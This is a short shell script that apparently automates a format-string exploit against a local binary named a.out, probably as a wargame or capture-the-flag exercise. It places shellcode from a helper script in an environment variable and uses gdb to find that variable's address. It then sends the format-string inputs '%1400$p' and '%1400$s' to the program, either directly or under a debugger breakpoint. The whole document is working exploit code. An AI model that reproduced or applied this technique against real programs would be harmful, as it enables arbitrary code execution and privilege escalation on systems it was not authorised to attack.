#!/bin/sh

unset OLDPWD

export PLO="$(./shellcode.py ffff0101)"

env_addr=$(gdb $PWD/a.out -batch -ex 'b main' -ex 'r < /tmp/s.txt' -ex 'find PLO=' | grep 'PLO=' | tail -n 1 | cut '-d ' -f3)
env_addr=$(echo $env_addr | grep -Po '[a-f0-9]{6,8}')

echo "env addr = $env_addr"
echo
./shellcode.py $env_addr info
echo
echo

./shellcode.py $env_addr | hexdump
echo
echo

export PLO="$(./shellcode.py $env_addr)"

echo '%1400$p' > /tmp/s.txt
gdb -batch -q $PWD/a.out -ex 'r < /tmp/s.txt'

echo '%1400$s' > /tmp/s.txt
if [ "$1" = "real" ]; then
    ./a.out < /tmp/s.txt
else
    gdb -q $PWD/a.out -ex 'b *0x0804859a' -ex 'r < /tmp/s.txt'
fi
